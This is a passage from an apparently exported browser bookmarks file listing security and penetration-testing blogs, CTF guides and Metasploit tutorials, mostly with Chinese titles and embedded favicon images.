icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC+0lEQVQ4jZWTe0hTcRTHz7m7d3fbna5UfG2WpiUto0xKDCNEIyKSXobVH5oSJkZUVBCVLaOCsgSt6CkVCvb6wyxmofbA1PCRw3ykorM5l6bTTabb3d1+/SHioiL6/H3O93w553sQfgcBgAzUXl8mt9qXcpvWt0lw9VcCgAhA/lA/BwFAIIQqv3Ig9cPO6KHO1Cj3YP4+g8P0fpeH+C/QnpMRgLy8mLkf3jYUimxmdpAmLh/zKxUK/ENbn9aLW7TpPiEEEZH8IjBrr5W0R9ck7s2N+zHGTntLnRa3i3YJxCmt1kqA43InSIsOEZs8RagZXwRfF+/JDq0tLFt7KrumgeaGaTvPeAMK3g6BYUMiTO0B/u+vlbeX6EdaMj0dUAAEK0pyUpR86zVu6PmSWN9PSbE3zlY2o9SkmOIZv7Awoyll95sCgyyx3jQe+fiLoWhksnV2JyC68Ui2VDWiLYvy+zFveEpwiqxNinCVLNAem1Jt1A8jlbq96UKXPYmw0iARb3MO2qysC5iEioKcF+cuFY9R1v42tRwtAW50uY0TSNtcYicYnwauUzZHrntSnHH5Y+9yOyMLFDMoEIedRsK7vtmsfgYXGwkAQHEh6k7DpHSUQoFS+jgEiZhneEZlBpl/wbOiB/Gbw30bWVP/hIBIy3wVAiuXiVh0mv2ldCcAAHUo42TXN0ncsfoBBa9UTDNevmFm8cojJ47fGle3NOsKxBTTfzh+YQYO9E84aTGjUnD8mmDvoxJJdA8AoAjgHFTOb2mL8WuweHFMRDeVoD1/u3tjtFoZEh6x4G5Xn/7dpMWenKAOqv8+al2QGLP4TLJ66z2PKwCBp+gOOl12ndumja/6TKpQsK3p0w/p0tKSSonTsbv+ky6no2Mg9G76qsQd6uSbnon8LZqkp5DVlOhWyOW0SK83X92wIa63rq7RYRwZv1P6oLJx9lf+/AtkTjAvLycuPX2LJStrazUhbQEAABrNTPD+iUYDFCEaKj8/O6ao6GDw39z+D39t/gk5YEjXKRxCwAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">史蒂芬周的博客 | 软硬兼施，娱乐共享</a><br>            <dt><a href="http://threatexpress.com/2017/10/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" add_date="1507696052" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACGUlEQVQ4jT2Su2tUYRDFz5l7d9fdZKORCHmZLWwS2CaJqYIW2ph6i/SCYdHCJlbaiA9EsA2C/4FCII8yf4OoBFIlRKPBBNdkyT7vvd93LO66wxRnhsM84MfT01MAkkgCgARAAElIPfE/JIV9tySkCcBMEr2HBDORAAiQDJWO9B6S5fOWuyTJNxsCVCyCVLfLdlskzACE6WzL5ZjLtXZ3m18+MwiG7twNBWxswDnMzqpcZhSp2+1toFnn4OD3h/e19U9BfiA+/nXj4/qI4KtVjI9bq+UrFb+ywlIJzgVPVlctmz14/Ki+s1N6/rL09l3r29ckiq7+PNZAwW9tYWKCa2s8PFSlwjgOATCTgTCyvDxafejbnWv3Hxy/epEowLOnGB721art7XF/H0EAIITETKYwPRPX/rhm09XrQ/eWbHMTIJaWcHZGCY2GpqeRyUAKBci5wfn5v9vbcA5BYEl85fUbDyGKEARIEnQ6WliAcwKMZr7dHpi7GRSLSb3OMFScuEJehYKSBGGo83MMDmJuju02zQyAoigzNpafmen++G7ZLAA4R+9JIpvl0ZHKZY2OKo5BGgCQcu7yrdtxrSbv0w5ISPAetRoWF+E9+2jQTFGUuT4lwTUalsv1AAkCXlxgclJTU+x2QZLkyclJj7MUMu9p1kMNgPcwg8T0EMlS+NIDCPTdACgxdZMCUmF9qlMhKcWx90lfpyXwD1J6LFFOe+giAAAAAElFTkSuQmCC" target="_blank" rel="noopener">MetaTwin - 借用Microsoft MetaData和签名来隐藏二进制有效载荷</a><br>            <dt><a href="https://pentest.blog/category/tools/" add_date="1507780417" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADZ0lEQVQ4jW1QT0wjdRj9fvNvf9NOxy3dFoF06zbbqJWk27CJCXuQQ+HgguImA4d1r3AgURO8msxZE/ekSU+EAxolYeVEIECq2KQRYnC3i5s2XVoDLZ0WynRmOjPtdMaLdYnxnd6XvO+973ukKIpEKpVypqen3/D5fN9Fo1HPwsLC883NTQsAEPwDURQZt9stBAKBr6KxWLaQy1UFQSARABAAYCcSibBpmg/dbrcHY8xEIpFvZmdniwAAq6urA6enpx83Gg2/qqoXtm2v7+3tPRUEgSR7CeFw2IMQ8mxvb389ODjISpL0QblcfokQgnQ6/Wkun/8sEolMybJsUxTVOj4+rs7MzCCqZ2BZVgsAvAAAu7u7TyYnJ387ODj49lk2e/4az+83Gg2+VCoNEwTh7XQ6f/X2CHgF4wpHGOM4x3FLLpbdf5HLfW4YBmiaNoAoyulpRVEECgAcAACWZTuqqnaTySSdyWRG2+32y62traNQKJSRm82wz+eDoaGh0/Pz81tut7sX5vx7wcbGhknT9PVsNhtdWlr6eWVl5SgWi/0oK8q7NE2Dh+MeT0xMFCiKelPX9cZ/DRAAgNfr/Smfz78HADA6OvpJ4/JS8HAc9Hm9LxKJxBdP1tcnMcYbqVTK6r1PAgASRREpikLt7OxI4XD4eHx8/L4syw81Xd8KhkKP/T6f7TgOy9D0r2tra89HRkbo+fl5x+/3X+3wFZLJpEsUxeHevLi4ODI3N0f/nxYJguDnef5es9nUCILw8DxvVatVr2maXDAYrCCELIxxS9d1u9Pp9Nu2bbpcrpZlWbRlWSwZiUTu6Lr+lqqqHpIkmaaqhlqa1l+v1+8DQMNxnEqlUolrmhZACGFN0xhJkqZomj5SFOUdgqZpqFarJ+12m2EY5vCsXB4mCCLz4aNHH0mSxBWLxXuGYXRq9Xrk98PDWUVRTmq1GkiSNFir1b4nh27efJ/F2KIo6tbZ2VnbNM1AX18fd1IovK3rutu2bd+FLP8Ctv26YRgtgiAKDMN4OI6rjo2NpciB/v7bLpfrqaZpf8qq6iFpukwg9Ee32/UWS6UvrW53IBQMBi8uL++yGF/DGN+xHWcKAWSXl5f3qHQ6/cOVUp9d4Zl4PP6AJMm71zDmCYLg7W6XtSxL43g+H7hxYx8A4G8EoZPyuVZmtAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">工具 - Pentest博客</a><br>            <dt><a href="http://www.fuzzysecurity.com/index.html" add_date="1507869150" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADcElEQVQ4jXWTW0xbdQDGv9P/udHb6QUKXQu0DLpabGHAGLEOlxjdHPCgMfPdhMQnfVgW9cG9GOMlxheN4cFr1C3RZVlECToJujHCtmxgWTs2LqWUW6GW03t7yjnHF/sg0e/5+31Pv4/CfyQYDBp6etp9jXZbr16rPZLO5LWrsbWVhaXotcnJqTsAlGqXOsByF9549UxfX9dZh8PRX2erten1BiLL+9jZTiiRBwvL16fufHbx+9FPE4lEHgDoKun3+81vnn/lnLu5cdjT1lKnNxgohtcBhIEiFcDShFgsgofhuAsMQ7MffDTyPoB98g9P3n37/LmjAd/rbleTwPMcRWgCihBAkSGXi5CkMlQVsJoFtlwuedJ72dvRWHyNAMBLz59p6zve/Y7Fam7YSiTDKTGzC0WxsoxGA3kfuVxeXd/Y2dxNiTtiOmMwGvTGTDa7Oj1zd4oAwNDgKf9jXs/w7zdmFj4Z+erluzOhb+psFtpiFroJ0VD37oVmro7++tqlb6+MhB89ZAhhehiuphRf3/6RBgANASdVJDIXioiRyOJiKnUrY2uwful2NQ1QFOVYXo2Pv/fhxxMA1BPB4JK7eU9psFkP2e1GnQYAivnCX7Ks5CwmwdXa2twOAKmsuFPI57O5XA7bWwkJAJxOZ2urp+mk02GnCU1Xamp4mQCAzsCUA/5Av63WelRWIGh5XiYazekOf/ug1WpiV9c2SSFfqg8Gjw13PO4bdDU7qfjGxo2b06ErNABMTNxODTw3MH68u/MpXqt90e1qfMZkErTuwy6W41l0dwVOSvvKE+5mJ+v1tFCx2Hp2ZSX+cygUylc9UH8a++Wyt83V39sdGOrqbDepqorQfAQVqQxFBfXs00Gu1mqBKKbV0P0H46Njv40DQNUDRKPxtCLLW4JJOGavr7Wl0xnMzs6DYxkUi0UcstdDVRXMhcLrn39x8a1HSyvhf5kIAJd+GJ1yu9x/tB52+TiO05x4shdGgwH5QgEcx4Hna0BoZlcGPV9lNAe+oEqVkmg2m8HxvEpRlGoUjNDrdIitbSgsy6rJZFLKJ5NcFaAPDJCHi6ubs3P3FxeXo4JULnFnXxgSZv8Ml77+7nK0w+9buH7z1tXlzc2d/3sjAOj8Xm9LrlxwCQbjkY5OX724J0bHxienK5VKDIAIQK2W/wbiNWqF0HJ43wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">模糊安全| 家</a><br>            <dt><a href="https://blog.quarkslab.com/index.html" add_date="1508461234" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACb0lEQVQ4jaVSS0iUURT+zv3v/880YYk5Qw5pEhWtspKcaSiSyMmFFARKLTKyxZS2aRERtJggWtpCrdwUREI1GPawUoSMDOkBRotaZA+MNNPKcUicce45LcywSYTo2xzOOff7zuMe4D9Bs53KyuvW0MToIi3ictJZic7O6h+z89FoVP2yPBPT00YoGG4qGYgPH2RGMAksnMDYYElZw22x1eVnd+s+A8D9Pv82RfIewNs/OgiEG/cwcz0E2UT0UgjfILJSBCsU6KGlVaS3o66/uOLCGcut+1z+xSlvnhrMzRl9YYXKGzcZw80ETCqtIp5sdSqZZ19xjXFMFCVZZC8J/AXFZe1myt5JLrscbnvc67fKliz15Os0yyER+LSi6t6OIzdnjTxYWnrp9IROFLDIbivubLRclIQxDb3nqtpCra3LPZ50kxLGFiK8cbmdB5kb7u4+MAlFNwRwM3gdlBolURoAUlNKs5BoQDwADSORnpzrmyyhhEBYmDzkWG1Gq+PBw9eKvn7hZbZWt5QC9QNSmHJU4VwChniDABYUfXgSq3lFbtdJInqcTOqzH5kvUiDcVGuMqVeKrjqOdbSnvfb7DDkYbgwY5hYBpdxwynu6IgOZBXQW65ZxMluZZV8yZfzBHU0xEh4xjCLDvB9Ajm2htqfjbzIA6K6uSHzz9uZjU5TShmVXmk0ZAAPAmr4Uei1a9c1FxsyjgXd34qvWhjt5yhoSojwAub8FAK8wrc9fXfH8U3/7cKYAZQZC4fM+BgcEHBLGGiHyQSTLUuqpbS048ehezci8ArNRWhrV8Hrd6QmyXQ6rHO1LxGJVqfk4/4yfUmIHUhu8HUcAAAAASUVORK5CYII=" target="_blank" rel="noopener">Quarkslab的博客</a><br>            <dt><a href="http://payloads.online/archivers/2017-10-12/1" add_date="1508494370" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAwElEQVQ4je2QsQ7BUBhGT6US6SIdDBWLyQv01kNQ7SDps5iYaOJh0HTUGDt5Bg9gMiiLXoNU3KgBI2f+7vm++8Ofr9FsISTAoT8DwDENALJ1yCKKtCJY5ABaTesu0N9pK0o6psExCQGofLj8eUE9HgGQWRa1RlsJ2Y4zOfSmpQJlQVW/+c77nZqSclwUOKbBaTMvF6Rpqg2DoPtqbj0ecUxC8vwCwHIVacp1H/Fdd6t8QwhpCyF9byB9b1D65le5AlDEM1L+XA7PAAAAAElFTkSuQmCC" target="_blank" rel="noopener">PHP代码审计技巧总结 | 倾旋的博客</a><br>            <dt><a href="http://blog.orange.tw/" add_date="1508336040" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACBElEQVQ4jXWSzWsTYRDGf/PuxiRuEqlCsFFJerbRk2BvehFP9qAn8Sh4FfwA0X/AgxXvVjwUBXvqRfBiPYlaFBEvnhoxgjbUhHztNtnd8bC7SRrtwPB+zTzzzPMORKZTPgDWgd9ACzjJHiYJwKGVwvg2gO1PO1x+XUQz8HzjxzJw9X8AJl4/Dz76iC0QRrCp0ykyiyn8gQBcAp4B2WkAK14/DN4Nr+0ctegVDa4NoSjHmg53LOHevJcp563qq3pwN27p/XQLAPcPwu2vFx1m8wIasjEsElhwKr2FZQy/XOXEap+Gp9eBR5MAeaD984pDMSv4YdJftFExqIJtoOEqpZXeKDfR4PHSQpqSM04GCDGoGDotn8BX/BBmHeHhQppYkxHAmcWKzTDYLZBI5H/qHm4vwBgYBnChYgOcBbDj2GI5t7u6CHRaPlnHolLNA0q7GZ3LOQE4PMngXxPYjitHsxWdvV6ATEifADS+dxUz8aAhzFVzFGZs2k2f4UCZq+YpzNjUOgrRlI4A1tdqPimLXRaGUe1EA1UlZWCt5gO8iYkC4ADd6W8c0TSgCpbAlqscib4xC3gJgx5wa361T8NVMnYULHEFUUhbUfLxF32Am4AH41EGeOsFdB98GZ4r7BNK+w0H0oII1LvKk28+51+6eAE3gKU9xY+pPQU2AT/2zfguMx38F+BfzHPat3EEAAAAAElFTkSuQmCC" target="_blank" rel="noopener">橙子</a><br>            <dt><a href="https://www.cybrary.it/video/metasploit-part-5/" add_date="1508720536" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAt0lEQVQ4jc3SMWpCQRSF4U+fyAMR4w4EG7MJW3cQyBrsJJUbkfS6CVcQsgC7YGljo22Mz+aOPFSIWKgHLhyYO/85DMOzqBLzmOQGWtiiWmryhyJ8ceL3yJHV0MYEfWywC1Aei+WwMmiFcUpr4hPvWGOEJV7iPAtAaljHN34SOekjEhboXfkER1MNP4gWBd7QwQzzaForNTpTgnTxFZDfmGFc/FdpKcc0QK/XXLzU5BL4Jj3ml95HB2t1H91gkAvdAAAAAElFTkSuQmCC" target="_blank" rel="noopener">Metasploit（第5部分）msfcli - Cybrary</a><br>            <dt><a href="https://3gstudent.github.io/3gstudent.github.io/" add_date="1508722106" target="_blank" rel="noopener">3gstudent – Good in study, attitude and health</a><br>            <dt><a href="http://www.cnblogs.com/WangAoBo/tag/Writeup/" add_date="1509105326" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACpUlEQVQ4jU2RS08TYRSGz/nmm+l1sDVeWkmJZGIg2KmGeIliGkJkQyBhiRs10Y3G38Iv0BiN0RVbCY1KsZowCpQ2MdQpYKyVRQm1rYPTdma+46LB+Kze3XvDbO5NNptNp9PpG2lA9vLVi0KhcP/e/aFz54UQyJAEISIcwUzTnJmZKZVK5e1y6/cvIpqdnTXLZUQkAiBCRESkI1g8Fm+321NTU/nNfKPRDAaDqqo6jkNEQEQAACCEQMRutyuE4BdTl5YyrzVNsyzLNE1F8dVqtYFEAhGFEFzivSSZTGZpaUlVVRaPx6vVn6ZphkIhwzBCoeDe3t7a+lptv6b4FNd1iQgRS6WSYRi5XE6KRCLJ1MjVK5eTuj42NtYf79c0jTxYXFwkgMGzg67rAoDf749GoyMjI1gsFnVdd12HABCg15Vz3mwdPH32NKVfmBi/CYALCwvlcplzznRdJwLOZS7JAIjIOOcE7rG+4w8fPNrYWC99NYmo1WpVKpV6vc53d3clSRJCRCIRVVVt297f3ydwHa8bP31mcnLyk2EMDw2lUqlAIBAMBqXR0dFqtWqaZjgcjsVijUZjZWWlUvmxs/MtHFYHBgYLhUIymUwkEpqmHR4ewr9HPM9zHKfb7dJ/NBqNx4+fNJtNIUS9Xl9eXuadTocxhoiMMcYYAPRmISLGJNu2Pc/1+wOO4yiKMjw8zCVJIiLGWG/vf9r1OrIc+ryxGjtzQlFkACAQp06dYJb1W5ZlIbyeDyJDRJTI7wsVv6xvbW1NjE8aax/fvsv4FL/nCelkLBoOB9Q+tdNuCxIkxGHbstt/Nosbq8bq3NytsNr3/Pkzc/urZVlcUvj09PT8/Lxt29evjZEAQFJ8cj6fr/yo3Ll9lwQcHNRkRf5eqX14/+GYGv0LhBN+F3s4tlQAAAAASUVORK5CYII=" target="_blank" rel="noopener">Writeup - 标签 - M4x - 博客园</a><br>            <dt><a href="https://blog.zsec.uk/" add_date="1509324475" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAChUlEQVQ4jWXSSUjUcRQH8Pf7/bf5z+KMTZhmJraBYYY52WIZqa2GQRk6GFZ2ENosOkRSUDepQNA6FAkRiJ3sEEIFYgmVVodEsJKcMBfMJbcZZ+Y//997HcaNesf3vu/xDh+2ubAO/i8iAmCMERFjbOlEXmgR0WKbMQYQHRERAfD5DAcgwzBD4QjA4sbSm0TEAMJzGeBT/vD+XetuX8oLzEY4AyIQiEKgEIhIQqAs8cnpYEXJ1gul2yemg/I577bTx7b0DU1ommwKlDhXJSn6EyIRkInIJZ4U7zyYsyEhzsFyyx4LpLVJseVFnmt3X966mJexMSEYNBFIUyQjIsqrmiqKs776Rl+2fXe7rCz1UI0QyCW+frW79kaBK0afmTVcDotFlX+P+226gkg3a1vetPuQkIBxVZasugoEYxMBV4xeXtWUf6q+ufVbb/94yZVne8vqAyEjHDaD4YhN13RN5sCAcwZEIcPUNdnttFZfPZCdmWwY4umdojVJy3RNiQgUghhnDJjkTM6fmglZrUqOJ8XpsHiPpGemJbZ86H31tufE4fTC3NSfA5MDw9Oj44GRPwHTRFZyudEda9Utym5P8vV7r58/KI2YqKrSyriYz12De7JSsr0PvQXpERM/dQ3YdEXaV3jm/MkdnrRVxZWNmqokxjvuN7R3dPb3DU5UP2pzx+pfuocbXnSePZ5ZWbZzeMwv/Qpt6u4diRii+8eoLPOW9z5/0BgamfnYNWjR5ObWHkRUZWnFcntrh6/myTuWcbQuZJjBkBlj14hI4pyAopoQSeJMIDGAQNBgjNltqiyQVEW2aIoQyBjDpQQBkAAACMBu0wBACJKjVIX4l/EC1XnLc4j/AhgHRJzVOOeSAAAAAElFTkSuQmCC" target="_blank" rel="noopener">信息安全探险</a><br>            <dt><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/" add_date="1509199795" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">简介 · CTF All In One</a><br>            <dt><a href="http://www.vxjump.net/files/a_page/2/security1.htm" add_date="1509332298" target="_blank" rel="noopener">From Vx,Jump Security…</a><br>            <dt><a href="https://ub3r.cn/?p=30" add_date="1509854970" target="_blank" rel="noopener">如何优雅的维持住一个Web shell – ub3r</a><br>            <dt><a href="https://0x00sec.org/" add_date="1509765327" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACNUlEQVQ4jY2SMWgTURjHv/fu5TXvTmKsFKHorlOrCGK6lgqCBUXoUAjEIZdcYshgFqduXXS5ene9W2IXFYuDpULpWMGAIHbUxc3BTuGIuby77xIHexLilfabHv/v//u+P4+P2Lbd4pw/DcOwaRjGFpyhNjc3H2QyGQ8RNygimgCwp2naS8/zCqfBjuNc55xvD4fDjhDiGQEAWFtb47Ozs7uKosxJKW8bhvEjDTZN87Kqqp8Q8aeqqovFYvE3SZqu654nhBxSSuNer7fQbDZ/jcPr6+sXpqenDyilF7vd7nyr1ToCACDjJtd1rzLGOqPR6LuUcrFWq/WON08JIXYVRVmQUi5Uq9WvCUPHB+i6/i0IgrsAcJMx9iLRhRDPOeeLiLg8Dv+XICnLsu7lcrmdfr+vE0J8VVVf+76/ahjGq0lv6gAAAMdx7hNCgjiO5Wg0mqnX62/TfDRNBAAghBAAgGw2++995gG2bS9rmvaOUnoljuNL+Xz+jeM4q6mLJgXLsgpCiI9RFG3puv4IAMDzvA3Oed33/TuNRmP/xASWZV3LZrMfwjD87Pv+40QfDAZPwjDc1zTtveu6N1ITtNvtfBiGh5RSRMRCtVo9Gje22+08Ih4AwAwiziV9CvD3UBBxmzEmoihamoQBAEqlUvf4RiJFUXYsyzoHAEBM05xSVXWLMbYyGAwKlUqlk/ZZSXmeN88Y+4KIe1EUrVAhRINSuhQEQfE0GACgXC4fSikfMsZuKYrS+gM9auz8qmLRcQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">0x00sec - The Home of the Hacker</a><br>            <dt><a href="https://pentestlab.blog/" add_date="1510194962" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Penetration Testing Lab | Articles from the Pentesting Field</a><br>            <dt><a href="https://blog.ripstech.com/" add_date="1510272189" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC5UlEQVQ4jYVTTYgcVRD+6r3X3dPvzUz3W3e2u5coLCYEEkEX8SIEchCCP1lEchEJKAoqJIogBAQJaMSbqOgeFE9GPESjElQSCDkIQiJ4MCiigopkd91dd3Yzmdnp6X6vPGyEnb1Yp6K+rz6qqK+A8SAAAgAQT+zSaX7ZTExfRLPZuYmLHfyxggDAAHyc5EdMHF0hopKZjQlb30Xt/H4A/n+EEmts8aGxBRubnwAgAURNW5wydpq1LeYBmO099J9C1J46pJR6D+A+jfjIKAQFXrwN8mXt/XEJnwgRnWFi57h6cthd+WZLpZlNmbR4Q0n5GZg/6q8tzjpF9ynGB97hZO39m5Lkx57kXTe6ozuZ/XkF9ZVOilNIEkuBnrw7jIJzAGrHfFSCjjJYDtaHLxgb3lZVrhqxXDOheIsZyx44K4nOAOhV9eiBmyukqbbxVSnVLu/cl/3uwsNxWswxOQ0WUhBWB92lCyYtLgqlDnhX/9zvLs4CGFKUTN2uhHyFgT+88z9KKecB3/cez29uLH0CACbNHwfR62BIDzwj4A8wKBmU1ctKEbfAtI8JPxDzn3B8DBKPCSneNWneZIIBiVfZ8yVP/lNyWGBBPYDujRRtXSRsTuw3afG9scVPUWtyLwDESf6iscXI2KKvbf4sAARpZ7Zp89+0zb9tNJIZAEAjnTyo0/wkAOhW9pBOiytxmj23JZzdEbU7uwFA2+wlnRaXG2l+EIDSSfZa0L7lHtJ6cppCdah2vFr2/j6HZt4xAd4hiPBG3XsqDoKYOHofzMuD9foYsNqL06lHGDDDms6PGUlIsYfK+uxgsLqgbfE0wE8A8B40P+wunm40shlq4DCDrg7Xly6NOREAGkk2Q4Ie9N7/Um4sX4jand2icuXm5tpfkc0OS0e3DqrqC2z+c237923PGQDpVjYHIfLBhj+NZBhqET/qnPu9vL7y9Q7u+ATbgXAi3x8wz3lPtWf3eXl95dedHAD4F9/zHcJEiT+SAAAAAElFTkSuQmCC" target="_blank" rel="noopener">RIPS技术博客</a><br>            <dt><a href="http://k4linux.com/" add_date="1510358998" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADGUlEQVQ4jW1TTWxUZRQ997038zozTDutDsWxNiKlkRgCMf7VSqLGKOLfGk1csDExaExYkIAkLIyu3GiUAFGC7MbfRBfaNILVREr4SdFiRal1pFI6nXamw8x77/ve9x0XOB013tXNveecexfnAP+o/fvptHr+vPdmzn18H+c+updTOwsrc7YxACBobwQiZO3ktrlo3fNfn1HDpYrbIwD780750Xs6xm6QiWOS2zJKUkSEKwJ/DySsl948Mpp65eioC5ch1qwGHHFQrriInQy2PxjbFx9vviH+mldXREgKANQXZ97e+16Dm3fM6K/GF1SkG4YMSIZUcdOcOFdTwy+V433HLKkXX2sdvv594/wzBz+vcXjnTNQMrxlSM4iUbUbKNkNlg0hZUtGYwGx/vaI//DYiaxNbr5OLcKdL8yOP7V6wv/xR1cbGNtLKaqNtI4zYCENqo22otDVW2aXlpvrgOG0Ux0UA8HD3kfVjk7hrbW+Egb4uDzBYqEZM+47ksj4AQbUeiqWww/eQyzrehkKI0ryzheXvCh46B25dDpKpL88q+WysbE9MKLmjH5iaFa4ruJLvdPHrrGZ/r4unHuiBpYusH4iO/Bzy69d68FyQglya6O12ZeCWDNIZ4IUnk/jtSgQ/ASRdIpd18MPFJfgeuNQQua0vBUAcD82pUueq28MnhlL+0MYuGdpILDdiZjOeDPanAQBax2IsqGIimYBMXgrpODZA48plB1M7Lj6y2R+/MJtGpa61MrDJpIdIk83IIFAWFi4hDjLpJIyxxkga+W7nDLo2zTjyEOK+9PT7W+9MyMtvNZl0reMnBKTAEaEjIAAkPBdCzfEfr9nCal9WdYTviKBtJMbVA/uOkk/vmVcXfq/rlomsjWwch2a+UtUjJ+fUpaukUsHhfxuJlGKx6FItHnr3i4gP765z14EFjpxasqcml+zxs4v85nzEyxXSmPDQ6dMHEy1yO0ytTNXOPXvVDD43/pO6v6ezI5XvcuEnGdzU7X7vo3pY/Bs//f80tkNFAOCfn2xA96YCkDaI6iXJDU7/FwMAfwEC9NqS1xrp/wAAAABJRU5ErkJggg==" target="_blank" rel="noopener">k4linux - Linux教程 - Kali Linux - 渗透测试教程</a><br>            <dt><a href="https://haiderm.com/fully-undetectable-backdooring-pe-files/" add_date="1511312708" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC7UlEQVQ4jU2Oa0hTYRiA3/c7ZzmPzTNzUztzLZcppWvdlkmYZRdb9wsFlRQUUdHNCkJCKfoddIESIQqK/mZJF5DS6EJpVKiVuxRG5RTPzqJt7XbO+b5+SNTz8/nx8KCmaYQQRFRVNZFIiKIYCAT6+vqHvn6NRJRYLF5aWnq88Rj8hec4DgB6e9+camoqKipSVfXZ8+epdCajakiIpuluV2Ug+HmCgbdY8h2OqXj/wYMLFy/19Q/EEsmJJlMqmcrNFScYjTzPISIh5PfvZESRNTVDKZ1cWIjmfGsyreZbrYKQgwQBkFIK/2AASAhhjGVlZVXNm40FNofJnMcYU9WMplOOEEIIAFBKKWWEIzzHEUQAoIwBo7xRyBlPOuz2wgKLaDIZjUYESKczv2IxOayMjsmJZJLneabT+XPdPNU1yliJY8rehu2STRJFMUcQeAMPDFKplBwOD4dCnU+edj17kZ1t9AeDfFFhwY/RMdfMGdXVC8vKy+H/fcYQEQC2bN60befugUFfXU0NP33atLGwUldbkyuKrW1t3799X7y4ZlV9vaqqBoMhFo